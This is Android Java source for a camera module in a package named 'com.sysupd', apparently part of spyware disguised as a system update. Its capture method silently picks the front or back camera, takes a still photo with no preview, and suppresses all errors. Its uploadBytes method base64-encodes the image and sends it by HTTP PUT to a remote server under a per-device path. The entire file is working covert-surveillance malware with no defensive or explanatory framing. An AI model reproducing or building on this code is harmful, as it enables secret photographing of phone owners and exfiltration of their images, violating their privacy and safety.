package com.sysupd;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.ImageReader;
import android.os.*;
import android.util.Size;
import android.view.Surface;
import java.nio.ByteBuffer;

public class CameraModule {
    Context ctx;
    public CameraModule(Context c) { ctx = c; }

    public void capture(final boolean front, final String label) {
        try {
            final CameraManager cm = (CameraManager)
                ctx.getSystemService(Context.CAMERA_SERVICE);
            String camId = null;
            for (String id : cm.getCameraIdList()) {
                CameraCharacteristics cc = cm.getCameraCharacteristics(id);
                Integer f = cc.get(CameraCharacteristics.LENS_FACING);
                if (front && f == CameraCharacteristics.LENS_FACING_FRONT) {
                    camId = id; break;
                }
                if (!front && f == CameraCharacteristics.LENS_FACING_BACK) {
                    camId = id; break;
                }
            }
            if (camId == null) return;

            final HandlerThread bg = new HandlerThread("cam");
            bg.start();
            final Handler h = new Handler(bg.getLooper());

            CameraCharacteristics cc = cm.getCameraCharacteristics(camId);
            Size size = cc.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                .getOutputSizes(ImageFormat.JPEG)[0];
            final ImageReader reader = ImageReader.newInstance(
                size.getWidth(), size.getHeight(), ImageFormat.JPEG, 1);

            reader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                public void onImageAvailable(ImageReader r) {
                    android.media.Image img = r.acquireLatestImage();
                    if (img == null) return;
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    img.close();
                    uploadBytes(bytes, label);
                    bg.quitSafely();
                }
            }, h);

            cm.openCamera(camId, new CameraDevice.StateCallback() {
                public void onOpened(final CameraDevice cam) {
                    try {
                        Surface s = reader.getSurface();
                        final CaptureRequest.Builder req = cam.createCaptureRequest(
                            CameraDevice.TEMPLATE_STILL_CAPTURE);
                        req.addTarget(s);
                        cam.createCaptureSession(java.util.Arrays.asList(s),
                            new CameraCaptureSession.StateCallback() {
                                public void onConfigured(CameraCaptureSession sess) {
                                    try { sess.capture(req.build(), null, h); }
                                    catch (Exception e) {}
                                }
                                public void onConfigureFailed(CameraCaptureSession s) {}
                            }, h);
                    } catch (Exception e) {}
                }
                public void onDisconnected(CameraDevice cam) {}
                public void onError(CameraDevice cam, int e) {}
            }, h);
        } catch (Exception e) {}
    }

    void uploadBytes(byte[] bytes, String label) {
        String b64 = android.util.Base64.encodeToString(bytes,
            android.util.Base64.NO_WRAP);
        String url = Core.BASE + "/files/" + Core.DEV + "/" +
            System.currentTimeMillis() + ".json";
        String body = "{\"type\":\"" + label + "\",\"b64\":\"" + b64 +
            "\",\"ts\":" + System.currentTimeMillis() + "}";
        Core.http(url, "PUT", body);
    }
}
